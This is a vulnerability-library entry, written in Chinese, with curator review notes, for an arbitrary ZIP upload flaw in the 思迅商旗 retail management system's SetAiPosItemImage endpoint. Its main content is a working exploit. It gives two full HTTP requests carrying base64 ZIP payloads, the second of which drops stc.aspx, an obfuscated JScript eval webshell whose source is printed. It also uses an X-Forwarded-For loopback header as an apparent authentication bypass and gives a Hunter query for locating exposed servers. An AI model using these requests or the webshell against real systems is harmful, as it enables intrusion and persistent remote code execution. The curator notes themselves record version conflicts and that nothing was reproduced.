---
source: "wy876 漏洞文库"
title: "思迅商旗商业管理系统 SetAiPosItemImage ZIP上传解压写ASPX"
product: "思迅商旗商业管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "标题/范围10，简介却7，版本冲突；IIS JScript支持"
prerequisites: "无Cookie但XFF回环头，权限绕过未解释"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fbpfgs6seeig8wdu"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%80%9D%E8%BF%85/%E6%80%9D%E8%BF%85%E5%95%86%E6%97%97%E5%95%86%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F10SetAiPosItemImage%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name==\"思迅商旗\""
id: "vw-77d1908854eae7e3f4d912d8"
entity_id: "ve-77d1908854eae7e3f4d912d8"
schema_version: "1"
previous_fofa_unverified: "app.name=="
---

# 思迅商旗商业管理系统 SetAiPosItemImage ZIP上传解压写ASPX

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：思迅商旗商业管理系统；SetAiPosItemImage ZIP上传解压写ASPX
- 版本、配置及部署条件：标题/范围10，简介却7，版本冲突；IIS JScript支持
- 认证与权限前提：无Cookie但XFF回环头，权限绕过未解释
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 内嵌Base64 ZIP仅内存静态解码：第一包正常CSS，第二包stc.aspx为正文所示eval JScript；二者是检测文件与执行文件变体
- 普通CSS落盘不证明任意ASPX可执行；第二上传后无执行响应，需运行时与目录解析条件
- 长期webshell写入没有清理；外部zip/jar/yaml未下载运行，不应默认可信
- 必须核7/10真实范围、XFF作用和厂商修复，HTTP长长度需重算

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思思迅商旗商业管理系统7 SetAiPosItemImage存在任意文件上传漏洞。

## 二、影响版本
+ 思迅商旗商业管理系统10

## 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征

## 四、漏洞复现
```http
POST /api/POS/SetAiPosItemImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Length: 416
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
x-forwarded-for: 127.0.0.1

{"Body":{"pos_id":"test","file_data":"UEsDBBQAAAAIAJmoeFdm5m19YgAAAGQAAAATAAAAaW5pdC1jNTIyMjg1MzVhLmNzcwXBQQqEMAwAwLvgH3rcPXRJaV3Qk19JkxQLGsUqKuLfnekn4Yym0CqiBpXNZ8LTHpm3oXM+wHJ+77r6qRzF0rzrZpOTBjhBixJT5Cb9OXhHPgZwBBRvzmUZ8ep0Vnnq6nkBUEsBAj8AFAAAAAgAmah4V2bmbX1iAAAAZAAAABMAJAAAAAAAAAAgAAAAAAAAAGluaXQtYzUyMjI4NTM1YS5jc3MKACAAAAAAAAEAGADoFpjO1h7aAQAAAAAAAAAAAAAAAAAAAABQSwUGAAAAAAEAAQBlAAAAkwAAAAAA","last_time":""}}
```

> 请求长度说明：原资料 Content-Length 为 416；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```plain
/AiItemImage/init-c52228535a.css
```


漏洞利用

准备webshell`stc.aspx`

```plain
<% function E873yr9k(){var GEPH="unsa",YACK="fe",C910=GEPH+YACK;return C910;}var PAY:String=Request["x"];~eval/*Zf10I0IzZH*/(PAY,E873yr9k());%><%@Page Language=JS%>
```

压缩webshell

[stc.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/1622799/1709222142219-d3f253b2-3b28-4613-acfc-43fc8ef73eba.zip)

将压缩文件转换为base64编码

[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222142539-f522d0ae-c3bc-443d-95b0-e63662e6b81b.jar)


上传webshell

```http
POST /api/POS/SetAiPosItemImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Length: 444
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
x-forwarded-for: 127.0.0.1

{"Body":{"pos_id":"test","file_data":"UEsDBBQAAAgIABeAKli/64yUkwAAAKQAAAAIABAAc3RjLmFzcHhVWAwAEkeiZa5OnmX1ARQAs1FVSCvNSy7JzM9TcLUwN64ssszW0KwuSyxScHcN8LBVKs0rTlTSiXR09rZVSktV0nG2NDSwBUlpg8Ssi1JLSovyFECi1rUgXQGOkVbBJUWZeem2QamFpanFJdFKFUqx1nWpZYk5+lpRaYYGngaeVVEeWvoaQLU6CEs1rVXtbFQdAhLTUxV8EvPSS4EMW69gVTsAUEsBAhQDFAAACAgAF4AqWL/rjJSTAAAApAAAAAgADAAAAAAAAAAgAKSBAAAAAHN0Yy5hc3B4VVgIABJHomWuTp5lUEsFBgAAAAABAAEAQgAAAMkAAAAAAA==","last_time":""}}
```

> 请求长度说明：原资料 Content-Length 为 444；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```plain
/AiItemImage/stc.aspx
```


[思迅商旗-setaipositemimage-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222142739-e95ae867-5ce0-482d-8b4e-707627bcdbe4.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fbpfgs6seeig8wdu>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
